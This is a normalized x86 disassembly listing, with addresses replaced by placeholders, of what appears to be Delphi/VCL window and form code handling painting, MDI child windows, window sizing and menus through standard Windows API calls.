mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_44d924
push ebx
push sub_44d93c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_44d903
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_419dd4
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_435238
sub_44d98f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44cc4c
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b3ac
mov eax ebx
call sub_44da78
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41f778
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41f794
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_434b54
mov ebp eax
push edi
push esi
mov eax ebx
call sub_434b10
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_44dd20
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_44dd50
sub_44da1c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_43b8e8
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_43bbec
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_44fd7c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43b8e8
push eax
call SendMessageA
pop ebx
retn
sub_44dab0
push ebx
mov ebx eax
mov eax ebx
call sub_44e9cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_44db44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b8e8
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43b9b0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_43b8e8
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_43b8e8
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_44dbcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_43be8c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41cadc
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41cab0
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403360
test al al
jne r-xdata
sub_44dc38
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4030ac
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44dc64
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax ebp
call sub_438618
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41cadc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_43bed4
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41cab0
mov si 0xfff1
call sub_403360
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41caec
jmp r-xdata
sub_44dcf8
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4352f4
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_4362b4
sub_44dd20
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_434b28
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_44dd50
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_434b6c
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_44dd80
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43502c
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_44eeb8
pop esi
pop ebx
retn
sub_44ddc4
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_44de1d
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44de24
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
sub_44de2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_434fe0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_438e40
mov eax ebx
call sub_438fdc
sub_44de64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41c928
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_44dea4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4392fc
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403360
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403360
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_4362b4
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_447fc8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e7d0
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fe10
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e11d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44e100
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_420440
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4202e0
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4494b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e107
xor edx edx
mov eax [ ebp - 0xc ]
call sub_420440
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_447fc8
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e7d0
call sub_43b8e8
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44e24b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fe10
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e224
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44e207
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_420440
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4202e0
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e20e
xor edx edx
mov eax [ ebp - 0xc ]
call sub_420440
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_43b8e8
mov esi eax
sub_44e22b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ReleaseDC
retn
sub_44e2dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_44e328
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44e804
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44e850
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_44e368
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_44e536
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41fcf4
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43959c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_434c50
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_433a48
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_44e2dc
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41fcf4
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_44e804
test eax eax
je r-xdata
push ebp
call sub_44e2dc
pop ecx
push ebp
call sub_44e2dc
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_44e328
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_44b648
jmp r-xdata
sub_44e548
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_44c810
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_44e5b4
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_44ceac
mov eax ebx
call sub_43bbec
test al al
je r-xdata
mov eax ebx
call sub_41cadc
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_43b8e8
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_43870c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_43b8e8
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41cab0
call sub_448b0c
mov edx esi
mov eax ebx
call sub_41cab0
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
sub_44e64c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_44e6c9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_44e6d4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_438e88
sub_44e700
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_438e88
xor edx edx
jmp r-xdata
mov eax esi
call sub_44c98c
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_44e738
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_434910
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_438e88
sub_44e77c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_434a1c
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_44e7d0
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_431fec
sub_44e804
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_452374
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_452360
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_44e850
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_452374
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_452360
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e8a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_4169bc
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_44e8d0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_43b8e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_452344
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_452344
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_44e8a0
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_452344
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_452330
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_416b18
call sub_403164
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_452330
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_452330
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_452330
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_44e9d4
push ebx
mov ebx eax
mov eax ebx
call sub_44e9cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_424484
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44e9fc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_438e40
mov dl 0x1
mov eax esi
call sub_44ed60
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_44eddc
mov edx eax
mov eax esi
call sub_4352ac
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_438fdc
mov dl 0x1
mov eax esi
call sub_44dd80
sub_44ea7c
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_43b8e8
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_445108
mov edi eax
mov eax ebp
call sub_43b8e8
push eax
call DrawMenuBar
sub_44eaf8
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41c588
xor edx edx
mov eax ebx
call sub_446aa0
sub_44eb1c
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_44ea7c
mov eax edx
mov edx ebx
call sub_41c588
sub_44eb44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
